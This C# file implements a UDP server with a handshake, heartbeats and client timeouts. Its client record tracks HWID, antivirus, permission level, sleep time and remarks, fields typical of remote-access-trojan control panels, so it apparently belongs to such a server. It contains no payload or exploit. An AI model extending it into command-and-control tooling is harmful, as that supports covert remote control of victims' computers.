using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RUDPServer
{
    public class ReliableUDPServer
    {
        private Socket UDPsocket;
        private MemoryStream ClientMS { get; set; }
        private byte[] ClientBuffer { get; set; }
        private EndPoint clientEndPoint;
        public ClientInfo Info { get; set; }
        public object SendSync { get; } = new object();
        
        private int ClientBuffersize { get; set; }
        private System.Threading.Timer HeartbeatTimer { get; set; }
        public long BytesRecevied { get; set; }
        public Dictionary<string, ClientInfo> ConnectedClients { get; set; } = new Dictionary<string, ClientInfo>();

        public bool IsConnected { get; set; }
        public class ClientInfo
        {
            public string HWID;
            public string RemoteIP;
            public string User;
            public string OS;
            public string WANip;
            public string LANip;
            public string ProcessName;
            public string Path;
            public string Active;
            public string Listenner;
            public string Version;
            public string Permission;
            public string AV;
            public string ProcessID;
            public string SleepTime;
            public string Remark;
            public string RemarkClientColor;
            public string Dllhash;
            public string CLRVersion;
            public DateTime LastPing;
        }
        private readonly int HeartTimeOut = 5000;
        public ReliableUDPServer(Socket socket)
        {
            UDPsocket = socket;
            ClientBuffer = new byte[1024];
            ClientMS = new MemoryStream();
            clientEndPoint = new IPEndPoint(IPAddress.Any, 0);
            UDPsocket.BeginReceiveFrom(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ref clientEndPoint, ReadClientDataAsync, null);
            HeartbeatTimer = new System.Threading.Timer(CheckClientsConnection, null, 5000, 5000);
        }
       
        public void CheckClientsConnection(object a)
        {
            var disconnectedClients = ConnectedClients.Where(c => (DateTime.Now - c.Value.LastPing).TotalSeconds > 15).ToList();

            foreach (var disconnectedClient in disconnectedClients)
            {
                Console.WriteLine($"Client {disconnectedClient.Key} disconnected.");
                ConnectedClients.Remove(disconnectedClient.Key);
            }
        }

        public void Disconnected()
        {
            HeartbeatTimer.Dispose();
            //UDPsocket.Dispose();
            ClientBuffer = new byte[1024];
            clientEndPoint = new IPEndPoint(IPAddress.Any, 0);
            ClientMS.Dispose();
        }


        public async void ReadClientDataAsync(IAsyncResult ar)
        {

            try
            {
                int recevied = UDPsocket.EndReceiveFrom(ar, ref clientEndPoint);

                if (recevied > 0)
                {
                    string clientKey = clientEndPoint.ToString();
                    if (!ConnectedClients.ContainsKey(clientKey))
                    {
                        ConnectedClients[clientKey] = new ClientInfo
                        {
                            RemoteIP = clientEndPoint.ToString(),
                            LastPing = DateTime.Now
                        };
                    }
                    ConnectedClients[clientKey].LastPing = DateTime.Now;

                    string message = Encoding.UTF8.GetString(ClientBuffer, 0, recevied);
                    Console.WriteLine($"Received: {message} from {clientKey}");


                    await ClientMS.WriteAsync(ClientBuffer, 0, recevied);
                    string receivedData = Encoding.UTF8.GetString(ClientBuffer, 0, recevied);
               
                    // MessageBox.Show(Encoding.UTF8.GetString(ClientMS.ToArray()));
                    
                    switch (Encoding.UTF8.GetString(ClientMS.ToArray()))
                    {
                        case "ACK":
                            {
                                IsConnected = true;
                                Console.WriteLine("Connect sucessfully!");
                                BeginSendAsync(Encoding.UTF8.GetBytes("SYN"));

                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBuffer = new byte[1024];

                                break;
                            }
                        case "SYNACK":
                            {
                                IsConnected = true;
                                Console.WriteLine("Connect sucessfully!");
                                ClientMS = new MemoryStream();
                                ClientBuffer = new byte[1024];
                                break;
                            }
                        case "HEART":
                            {
                                IsConnected = true;
                                Console.WriteLine("Heartbeat packet received");
                               
                                BeginSendAsync(Encoding.UTF8.GetBytes("HEARTBACK"));
                                ClientMS = new MemoryStream();

                                ClientBuffer = new byte[1024];
                                break;
                            }

                        default:
                            {
                                Console.WriteLine($"Received: {receivedData}");
                                if (string.IsNullOrEmpty(receivedData))
                                {
                                    Console.WriteLine("Error: Received data is null or empty");
                                    return;
                                }
                                ClientMS = new MemoryStream();
                                ClientBuffer = new byte[1024];
                                break;
                            }
                    }
                    UDPsocket.BeginReceiveFrom(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ref clientEndPoint, ReadClientDataAsync, null);

                }
            }
            catch (SocketException ex)
            {
                Console.WriteLine($"Socket error: {ex.Message}");
                // 其他 socket 相关错误的处理
            } 
        }




        public async Task BeginSendAsync(object msg)
        {
            await Task.Yield();
            lock (SendSync)
            {
               
                try
                {
                    string clientKey = clientEndPoint.ToString();
                    if (ConnectedClients.ContainsKey(clientKey))
                    {
                        // Sending data code...
                        Console.WriteLine($"Sending data to {clientKey}");
                    }


                    if ((byte[])msg == null) return;

                    byte[] buffer = ((byte[])msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                   
                    UDPsocket.SendTo(buffersize, clientEndPoint);
                    UDPsocket.SendTo(buffer, clientEndPoint);
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"Socket error while sending: {ex.Message}");
                   
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error while sending: {ex.Message}");
                }
            }
        }

    }

}

